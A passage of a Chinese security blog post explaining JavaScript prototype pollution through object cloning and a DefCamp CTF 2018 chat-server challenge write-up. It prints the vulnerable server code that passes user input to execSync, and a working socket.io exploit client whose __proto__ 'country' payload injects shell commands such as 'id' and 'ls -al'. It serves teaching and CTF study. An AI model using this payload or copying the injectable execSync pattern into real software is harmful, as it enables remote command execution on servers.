+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/14.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">14</span></p>
+<h3 id="3、对象克隆"><a href="#3、对象克隆" class="headerlink" title="3、对象克隆"></a>3、对象克隆</h3><p>实质上还是递归进行合并的做法，我们可以用前面分析过的方法理解。下面我们提下一般深层克隆的方法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        name: <span class="hljs-string">"rt95"</span>,<br>        age: <span class="hljs-number">20</span>,<br>        monry: <span class="hljs-number">1000</span><br>    &#125;;<br>    <span class="hljs-keyword">var</span> obj1 = &#123;&#125;;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params">origin, target</span>) </span>&#123;<br>        target = target || &#123;&#125;;<br><br>        toStr = <span class="hljs-built_in">Object</span>.prototype.toString;<br>        arrstr = <span class="hljs-string">"[object Array]"</span>;<br>        <span class="hljs-keyword">for</span> (prop <span class="hljs-keyword">in</span> origin) &#123;<br>            <span class="hljs-keyword">if</span> (origin.hasOwnProperty(prop)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span>(origin[prop]) === <span class="hljs-string">"object"</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (toStr.call(prop) === arrstr) &#123;<br>                        target[prop] = [];<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        target[prop] = &#123;&#125;;<br>                    &#125;<br>                    clone(origin[prop], target[prop])<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    target[prop] = origin[prop];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    clone(obj, obj1);<br>&lt;<span class="hljs-regexp">/script&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>大致流程就是：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、生成克隆对象 ------&gt;<br><span class="hljs-number">2</span>、判断 origin（被克隆对象）的元素是原始值还是引用值 ------&gt;<br><span class="hljs-number">3</span>、原始值直接进行赋值，引用值需要分情况 ------&gt;<br><span class="hljs-number">4</span>、引用值如果是数组，那么在克隆对象中创建一个空数组，然后递归上面原始值的克隆过程 -----&gt;<br><span class="hljs-number">5</span>、引用值如果是对象，那么在克隆对象中创建一个空对象，然后递归上面原始值的克隆过程。<br></code></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>原始值：</p>
+<p>存储在栈（stack）中的简单数据段，也就是说，它们的值直接存储在变量访问的位置。</p>
+<p>引用值：</p>
+<p>存储在堆（heap）中的对象，也就是说，存储在变量处的值是一个指针（point），指向存储对象的内存处。</p>
+</blockquote>
+<ul>
+<li>原始值就是单变量形成的值，值一般是字面量，像整数，字符串等。</li>
+<li>引用值就是对象，数组等结构型的值。</li>
+</ul>
+<p>那么克隆引用值的时候赋给克隆对象的值将会是原对象所指的数据处，那么相当于克隆对象和被克隆对象共有这组值。所以为了实现完全独一份的克隆，我们需要深入到引用值内部元素，然后进行克隆对象新建相应引用值类型数据结构后的逐一赋值。</p>
+<h1 id="4-实战题目"><a href="#4-实战题目" class="headerlink" title="4@ 实战题目"></a>4@ 实战题目</h1><p>题目来源于 DefCamp CTF 2018 ，源码可以<a href="https://dctf.def.camp/dctf-18-quals-81249812/chat.zip" target="_blank" rel="noopener">在这下载</a>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javscript">&#x2F;&#x2F; 客户端代码<br>const io &#x3D; require(&#39;socket.io-client&#39;)<br>const socket &#x3D; io.connect(&#39;https:&#x2F;&#x2F;chat.dctfq18.def.camp&#39;) &#x2F;&#x2F; 此处我们可以设为本地测试的地址<br><br>if(process.argv.length !&#x3D; 4) &#123;<br>  console.log(&#39;name and channel missing&#39;)<br>   process.exit()<br>&#125;<br>console.log(&#39;Logging as &#39; + process.argv[2] + &#39; on &#39; + process.argv[3])<br>var inputUser &#x3D; &#123;<br>  name: process.argv[2],<br>&#125;;<br><br>socket.on(&#39;message&#39;, function(msg) &#123;<br>  console.log(msg.from,&quot;[&quot;, msg.channel!&#x3D;&#x3D;undefined?msg.channel:&#39;Default&#39;,&quot;]&quot;, &quot;says:\n&quot;, msg.message);<br>&#125;);<br><br>socket.on(&#39;error&#39;, function (err) &#123;<br>  console.log(&#39;received socket error:&#39;)<br>  console.log(err)<br>&#125;)<br><br>socket.emit(&#39;register&#39;, JSON.stringify(inputUser));<br>socket.emit(&#39;message&#39;, JSON.stringify(&#123; msg: &quot;hello&quot; &#125;));<br>socket.emit(&#39;join&#39;, process.argv[3]);&#x2F;&#x2F;ps: you should keep your channels private<br>socket.emit(&#39;message&#39;, JSON.stringify(&#123; channel: process.argv[3], msg: &quot;hello channel&quot; &#125;));<br>socket.emit(&#39;message&#39;, JSON.stringify(&#123; channel: &quot;test&quot;, msg: &quot;i own you&quot; &#125;));<br></code></pre></td></tr></table></figure>
+
+<p>从命令行接受进入参数后，然后将序列化后的数据发送到服务端，触发服务端事件。</p>
+<p>在源码包里面我们发现了服务端引用模块文件 helper.js 中有如下执行系统命令的方法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">getAscii: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>);<br>        <span class="hljs-keyword">return</span> e.execSync(<span class="hljs-string">"cowsay '"</span> + message + <span class="hljs-string">"'"</span>).toString();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>在服务端代码中定位到使用此方法的位置：在 join 和 leave 事件里面都有使用：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 服务端代码</span><br>.......<br><br>io.on(<span class="hljs-string">'connection'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">client</span>) </span>&#123; <br>    client.on(<span class="hljs-string">'register'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">inUser</span>) </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            newUser = helper.clone(<span class="hljs-built_in">JSON</span>.parse(inUser))<br><br>.........<br><br>    client.on(<span class="hljs-string">'join'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">channel</span>) </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            clientManager.joinChannel(client, channel);<br>            sendMessageToClient(client,<span class="hljs-string">"Server"</span>, <br>                <span class="hljs-string">"You joined channel"</span>, channel)<br><br>            <span class="hljs-keyword">var</span> u = clientManager.getUsername(client);<br>            <span class="hljs-keyword">var</span> c = clientManager.getCountry(client);<br><br>            sendMessageToChannel(channel,<span class="hljs-string">"Server"</span>, <br>                helper.getAscii(<span class="hljs-string">"User "</span> + u + <span class="hljs-string">" living in "</span> + c + <span class="hljs-string">" joined channel"</span>))<br>        &#125; <span class="hljs-keyword">catch</span>(e) &#123; <span class="hljs-built_in">console</span>.log(e); client.disconnect() &#125;<br>    &#125;);<br><br>    client.on(<span class="hljs-string">'leave'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">channel</span>) </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            client .join(channel);<br>            clientManager.leaveChannel(client, channel);<br>            sendMessageToClient(client,<span class="hljs-string">"Server"</span>, <br>                <span class="hljs-string">"You left channel"</span>, channel)<br><br>            <span class="hljs-keyword">var</span> u = clientManager.getUsername(client);<br>            <span class="hljs-keyword">var</span> c = clientManager.getCountry(client);<br>            sendMessageToChannel(channel, <span class="hljs-string">"Server"</span>, <br>                helper.getAscii(<span class="hljs-string">"User "</span> + u + <span class="hljs-string">" living in "</span> + c + <span class="hljs-string">" left channel"</span>))<br>        &#125; <span class="hljs-keyword">catch</span>(e) &#123; <span class="hljs-built_in">console</span>.log(e); client.disconnect() &#125;<br>    &#125;);<br>server.listen(<span class="hljs-number">3000</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'listening on port 3000'</span>);  <span class="hljs-comment">// 这里的端口也可以改为本地测试端口</span><br>&#125;);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>参数 u 和 c 是通过模块 clientManager 中的 getUsername 方法和 getCountry 方法得到，跟进到 clientManager.js 文件中：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">getUsername: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">client</span>) </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.clients[client.id].u.name;<br>  &#125;,<br>getCountry: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">client</span>) </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.clients[client.id].u.country;<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接返回原先服务端注册生成的用户信息，我们来看看那个方法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">clientManager.registerClient(client, newUser); <span class="hljs-comment">// newUser 就是客户端传来的经过 clone 和 JSON.parse() 处理的数据。</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// clientManager.js</span><br>registerClient: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">client, user</span>) </span>&#123;<br>        <span class="hljs-keyword">this</span>.clients[client.id] = &#123; <span class="hljs-string">'c'</span>: client,<br>                                    <span class="hljs-string">'u'</span>: user,<br>                                    <span class="hljs-string">'ch'</span>: &#123;&#125;<br>        &#125;;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>所以上面的 getAscii 方法中的 u 就是我们客户端传入的经过处理的数据，只需让这个对象的 country 属性变得可利用即可，那么可以直接赋值吗？很可惜被黑名单过滤了：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// helper.js</span><br> validUser: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">inp</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> block = [<span class="hljs-string">"source"</span>,<span class="hljs-string">"port"</span>,<span class="hljs-string">"font"</span>,<span class="hljs-string">"country"</span>,<br>                     <span class="hljs-string">"location"</span>,<span class="hljs-string">"status"</span>,<span class="hljs-string">"lastname"</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> inp !== <span class="hljs-string">'object'</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br></code></pre></td></tr></table></figure>
+
+<p>被检测函数的黑名单过滤了，那么就不能直接给 country 属性赋值了，但是我们可以放到其原型里面，所以下面我们就来看看另一个处理传入数据的函数，clone() : </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params">obj</span>) </span>&#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span> || obj === <span class="hljs-literal">null</span>) &#123;<br><br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br><br>        <span class="hljs-keyword">var</span> newObj;<br>        <span class="hljs-keyword">var</span> cloneDeep = <span class="hljs-literal">false</span>;<br><br>    ......<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">var</span> proto = <span class="hljs-built_in">Object</span>.getPrototypeOf(obj);<br>                <span class="hljs-keyword">if</span> (proto &amp;&amp; proto.isImmutable) &#123;<br>				<br>                    newObj = obj;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    newObj = <span class="hljs-built_in">Object</span>.create(proto);<br>                    cloneDeep = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            newObj = [];<br>            cloneDeep = <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (cloneDeep) &#123;<br>            <span class="hljs-keyword">var</span> keys = <span class="hljs-built_in">Object</span>.getOwnPropertyNames(obj);<br><br>            <br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; keys.length; ++i) &#123;<br>                <span class="hljs-keyword">var</span> key = keys[i];<br>                <span class="hljs-keyword">var</span> descriptor = <span class="hljs-built_in">Object</span>.getOwnPropertyDescriptor(obj, key);<br>                <span class="hljs-keyword">if</span> (descriptor &amp;&amp; (descriptor.get || descriptor.set)) &#123;<br><br>                    <br>                    <span class="hljs-built_in">Object</span>.defineProperty(newObj, key, descriptor);<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    newObj[key] = <span class="hljs-keyword">this</span>.clone(obj[key]);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> newObj;<br>    &#125;<br>&lt;<span class="hljs-regexp">/script&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>由于我们传入的参数直接是对象（JSON.parse() 之后的结果），所以直接定位代码到处理对象的分支：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">else</span> &#123;<br>            newObj = <span class="hljs-built_in">Object</span>.create(proto);<br>            cloneDeep = <span class="hljs-literal">true</span>;<br>&#125;<br>......<br><span class="hljs-keyword">if</span> (cloneDeep) &#123;<br>            <span class="hljs-keyword">var</span> keys = <span class="hljs-built_in">Object</span>.getOwnPropertyNames(obj);<br><br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; keys.length; ++i) &#123;<br>                <span class="hljs-keyword">var</span> key = keys[i];<br>                <span class="hljs-keyword">var</span> descriptor = <span class="hljs-built_in">Object</span>.getOwnPropertyDescriptor(obj, key);<br>                <span class="hljs-keyword">if</span> (descriptor &amp;&amp; (descriptor.get || descriptor.set)) &#123;<br><br><br>                    <span class="hljs-built_in">Object</span>.defineProperty(newObj, key, descriptor);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    newObj[key] = <span class="hljs-keyword">this</span>.clone(obj[key]);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> newObj;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>其中这个方法 <code>getOwnPropertyDescriptor()</code>,返回指定对象上自有属性的对应描述符，由于我们通过 JSON.parse() 方法传入的对象已经具有 __proto__ 这个属性了，所以可以用这个方法获取到。</p>
+<p>通过 Object.create() 函数创建对象，原型使用我们构造的对象的原型，即具有普通属性的 __proto__,则可以成功通过这个方法使得 newObj 拥有我们可控的 country 属性，而后面方法 <code>newObj[key]  = this.clone(obj[key])</code> 再写入一次还是这个结果。至此，属性 country 被写入到操作对象中，等待被调用数据，我们构造如下 payload ：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> io = <span class="hljs-built_in">require</span>(<span class="hljs-string">'socket.io-client'</span>)<br><span class="hljs-keyword">const</span> socket = io.connect(<span class="hljs-string">'https://chat.dctfq18.def.camp'</span>)  <span class="hljs-comment">// 测试时换为本地地址</span><br><br>socket.on(<span class="hljs-string">'error'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'received socket error:'</span>)<br>  <span class="hljs-built_in">console</span>.log(err)<br>&#125;)<br><br>socket.on(<span class="hljs-string">'message'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">msg</span>) </span>&#123;<br>  <span class="hljs-built_in">console</span>.log(msg.from,<span class="hljs-string">"["</span>, msg.channel!==<span class="hljs-literal">undefined</span>?msg.channel:<span class="hljs-string">'Default'</span>,<span class="hljs-string">"]"</span>, <span class="hljs-string">"says:\n"</span>, msg.message);<br>&#125;);<br><br>socket.emit(<span class="hljs-string">'register'</span>, <span class="hljs-string">`&#123;"name":"xxx", "__proto__":&#123;"country":"xxx';id;echo 'xxx"&#125;&#125;`</span>);<br>socket.emit(<span class="hljs-string">'message'</span>, <span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">"hello"</span> &#125;));<br>socket.emit(<span class="hljs-string">'register'</span>, <span class="hljs-string">`&#123;"name":"xxx", "__proto__":&#123;"country":"xxx';ls -al;echo 'xxx"&#125;&#125;`</span>);<br></code></pre></td></tr></table></figure>
+
+<p>访问触发：</p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/15.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">15</span></p>
+<p>我们总结一下整个调用链：</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">1</span>、客户端传入触发服务端 <span class="hljs-function"><span class="hljs-title">register</span> 事件时的待解析的数据，包含原型的数据 ------&gt;</span><br><span class="hljs-number">2</span>、客户端触发服务端 <span class="hljs-function"><span class="hljs-title">register</span> 事件，传入数据被 JSON.parse() 方法解析后传入 clone 方法,由于__proto__ 是普通属性，可以将 country 的值赋给返回的对象 ------&gt;</span><br><span class="hljs-number">3</span>、返回一个具有 <span class="hljs-function"><span class="hljs-title">country</span> 属性的对象，值就是我们传入的值，拼接调用 getAscii 方法，执行命令 ------&gt;</span><br><span class="hljs-number">4</span>、服务端返回执行命令的消息给客户端，攻击达成<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5@ 总结"></a>5@ 总结</h1><p>利用一定的函数特征可以检测出一部分的 api 是否具有潜在的 prototype_pollution 的风险，这里是一位国外学者分析的<a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf" target="_blank" rel="noopener">结果</a>。</p>
+<p>其实这种攻击的防御是比较容易的，合并或者给对象属性赋值之前，检查键名是否为 <code>__proto__</code> 等敏感词即可。</p>
+<p>Reference:</p>
+<p><code>https://segmentfault.com/a/1190000008338987</code></p>
+<p><code>https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</code></p>
+<p><code>https://juejin.im/entry/58dfbe0361ff4b006b16638</code></p>
+<p><code>https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more</code></p>
+<p><code>https://stackoverflow.com/questions/8453887/why-is-it-necessary-to-set-the-prototype-constructor</code></p>
+<p><code>https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf</code></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>rt95</li>
+    <li><strong>本文链接：</strong><a href="http://59lx.github.io/2019/09/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20javascript%20%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html" title="http:&#x2F;&#x2F;59lx.github.io&#x2F;2019&#x2F;09&#x2F;09&#x2F;%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20javascript%20%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93&#x2F;index.html">http:&#x2F;&#x2F;59lx.github.io&#x2F;2019&#x2F;09&#x2F;09&#x2F;%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20javascript%20%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="/image/95.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/object-Object/" rel="tag">[object Object]</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/" rel="tag">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulneralbility/" rel="tag">vulneralbility</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2019/09/17/Xss%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F%E8%A7%A3%E6%9E%90%E7%9A%84%E6%8E%A2%E6%9E%90/"><i class="iconfont iconleft"></i>Xss 攻击向量解析的探析</a>
+    <a href="/2019/09/02/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5&JSONP%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/">规避浏览器同源策略 & JSONP的原理和利用<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-前言"><span class="toc-text">1@ 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-JS-的原型继承机制"><span class="toc-text">2@ JS 的原型继承机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-constructor"><span class="toc-text">2.1 constructor</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Js-中的原型链污染"><span class="toc-text">3@ Js 中的原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-真假-proto"><span class="toc-text">3.1 真假 _proto_</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-其他的几种攻击场景"><span class="toc-text">3.2 其他的几种攻击场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、-控制了多个参数"><span class="toc-text">1、 控制了多个参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、控制了路径赋值参数"><span class="toc-text">2、控制了路径赋值参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、对象克隆"><span class="toc-text">3、对象克隆</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-实战题目"><span class="toc-text">4@ 实战题目</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-总结"><span class="toc-text">5@ 总结</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="https://weibo.com/u/6479214985 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconweibo "></i>
+      </a><a 
+        href="https://twitter.com/rt9518 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  twitter "></i>
+      </a><a 
